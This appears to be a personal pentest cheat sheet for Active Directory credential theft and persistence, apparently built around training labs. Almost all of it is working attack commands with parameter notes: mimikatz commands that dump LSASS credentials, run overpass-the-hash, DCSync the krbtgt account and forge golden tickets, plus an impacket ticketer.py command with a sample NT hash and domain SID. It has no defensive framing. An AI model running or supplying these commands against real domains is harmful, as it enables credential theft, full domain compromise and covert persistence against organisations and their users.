---
tags:
  - Credential_Theft
  - Persistence
---
all the attacks are listed [here](https://adsecurity.org/?page_id=1821)

### Dump credentials from LSASS
```powershell
privilege::debug
sekurlsa::logonpasswords
```

---
### OPTH
```powershell
sekurlsa::pth /user:administrator /domain: dollarcorp.moneycorp.local /aes256:<aes256keys> /run:cmd.exe
```

> [!NOTE] Note
> The above commands starts a process with a logon type 9 (same as runas/netonly)

---
### Pull password data for the KRBTGT user account in domain:  
```
lsadump::dcsync /domain:lol.local /user:krbtgt
```

> [!NOTE] Note
> You can pull out any user, computer or domain controller by changing the user switch to the desired account

---
### golden ticket
mimkatz:
```powershell
kerberos::golden /user:ADMIINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt

# where:
- /domain – the fully qualified domain name.
- /id – (500 -> default rid from administrator account)
- /sid – the SID of the domain.
- /user – username to impersonate
- /krbtgt – NTLM password hash for  account (KRBTGT)
/ptt to immediately inject the golden ticket into memory for use.
- /aes128 – the AES128 key
- /aes256 – the AES256 key
```

tickter.py
```
ticketer.py -nthash 60d3803405f9c6f1c4f2ab08a0c18da0 \
  -domain-sid S-1-5-21-3276181164-781382281-1178861266 \
  -domain north.sevenkingdoms.local \
  -user eddard.stark \
  eddard.stark

```